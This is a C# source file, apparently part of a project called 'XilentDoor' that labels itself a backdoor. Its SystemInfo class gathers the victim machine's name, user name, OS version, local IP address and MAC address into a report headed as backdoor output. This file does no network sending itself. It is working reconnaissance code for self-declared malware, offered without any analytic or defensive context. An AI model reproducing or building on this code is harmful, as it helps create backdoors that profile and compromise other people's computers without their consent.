using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;

namespace XilentDoor.Core
{
    public static class SystemInfo
    {
        public static string GetInfo()
        {
            var sb = new StringBuilder();
            sb.AppendLine("== XilentDoor Backdoor ==");
            sb.AppendLine($"Machine Name: {Environment.MachineName}");
            sb.AppendLine($"User Name: {Environment.UserName}");
            sb.AppendLine($"OS Version: {Environment.OSVersion}");
            sb.AppendLine($"Local IP: {GetLocalIPAddress()}");
            sb.AppendLine($"MAC: {GetMacAddress()}");
            return sb.ToString();
        }

        private static string GetLocalIPAddress()
        {
            foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return ip.ToString();
            return "N/A";
        }

        private static string GetMacAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                if (nic.OperationalStatus == OperationalStatus.Up)
                    return nic.GetPhysicalAddress().ToString();
            return "N/A";
        }
    }
}